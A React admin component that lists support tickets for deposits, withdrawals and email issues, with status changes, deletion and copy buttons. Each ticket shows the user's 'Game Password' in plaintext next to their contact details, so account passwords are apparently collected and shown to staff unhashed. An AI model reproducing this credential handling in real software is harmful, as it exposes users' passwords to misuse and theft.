import React, { useState, useEffect } from 'react'
import { subscribeTickets, updateTicketStatus, deleteTicket } from '../lib/db.js'

const statusColors = { open: '#ff9500', processing: '#007aff', resolved: '#34c759', rejected: '#ff3b30' }

export default function Tickets() {
  const [tickets, setTickets] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')
  const [showAlert, setShowAlert] = useState(false)

  useEffect(() => {
    const unsub = subscribeTickets((list) => {
      setTickets(list)
      setLoading(false)
    }, (err) => {
      setError(err?.message || 'Could not load tickets')
      setLoading(false)
    })
    return () => unsub()
  }, [])

  const copy = (text) => {
    navigator.clipboard?.writeText(text)
    setShowAlert(true)
    setTimeout(() => setShowAlert(false), 1200)
  }

  const changeStatus = (id, status) => {
    updateTicketStatus(id, status).catch(() => {})
  }

  const remove = (id) => {
    if (!window.confirm('Delete this ticket permanently?')) return
    deleteTicket(id).catch(() => {})
  }

  return (
    <main className="page admin-page">
      <h1 className="section-title" style={{ textAlign: 'left' }}>All Tickets</h1>
      {showAlert && <div className="copy-toast">Copied!</div>}
      {loading && <p className="admin-empty">Loading...</p>}
      {!loading && error && <p className="form-error">{error}</p>}
      {!loading && tickets.length === 0 && <p className="admin-empty">No tickets yet</p>}
      <div className="ticket-list">
        {tickets.map((t) => (
          <div key={t.id} className="ticket-card">
            <div className="ticket-header">
              <span className="ticket-id">#{t.id.slice(-6)}</span>
              <span className="ticket-type" style={{ background: t.type === 'deposit' ? '#eaf3ff' : t.type === 'withdrawal' ? '#e8f9ed' : '#f1ecff', color: t.type === 'deposit' ? '#007aff' : t.type === 'withdrawal' ? '#34c759' : '#5856d6' }}>
                {t.type === 'deposit' ? 'Deposit' : t.type === 'withdrawal' ? 'Withdrawal' : 'Email'}
              </span>
              <select
                value={t.status || 'open'}
                onChange={(e) => changeStatus(t.id, e.target.value)}
                className="status-select"
                style={{ color: statusColors[t.status] || '#8e8e93', borderColor: statusColors[t.status] || '#ececee' }}
              >
                <option value="open">Open</option>
                <option value="processing">Processing</option>
                <option value="resolved">Resolved</option>
                <option value="rejected">Rejected</option>
              </select>
            </div>
            <div className="ticket-body">
              <DetailRow label="User Name" value={t.username} onCopy={() => copy(t.username)} />
              <DetailRow label="Mobile" value={t.mobile} onCopy={() => copy(t.mobile)} />
              <DetailRow label="Email" value={t.email} onCopy={() => copy(t.email)} />
              <DetailRow label="Game Password" value={t.game_password} onCopy={() => copy(t.game_password)} sensitive />
              {t.problem && <p className="ticket-detail"><strong>Problem:</strong> {t.problem}</p>}
              {t.amount && <p className="ticket-detail"><strong>Amount:</strong> {t.amount}</p>}
              {t.image_name && <p className="ticket-detail"><strong>Image:</strong> {t.image_name}</p>}
              <p className="ticket-detail"><strong>Submitted:</strong> {t.created_at ? new Date(t.created_at).toLocaleString() : '-'}</p>
            </div>
            <div className="ticket-footer">
              <button className="btn btn-sm danger" onClick={() => remove(t.id)}>Delete</button>
            </div>
          </div>
        ))}
      </div>
    </main>
  )
}

function DetailRow({ label, value, onCopy, sensitive }) {
  const [copied, setCopied] = useState(false)

  const doCopy = () => {
    onCopy()
    setCopied(true)
    setTimeout(() => setCopied(false), 1200)
  }

  return (
    <div className="ticket-detail-row">
      <span className="detail-label">{label}:</span>
      <span className="detail-value" style={{ color: sensitive ? '#ff3b30' : 'inherit' }}>{value || '-'}</span>
      <button className="copy-btn" onClick={doCopy} title="Copy">
        {copied ? '✓' : '⎘'}
      </button>
    </div>
  )
}
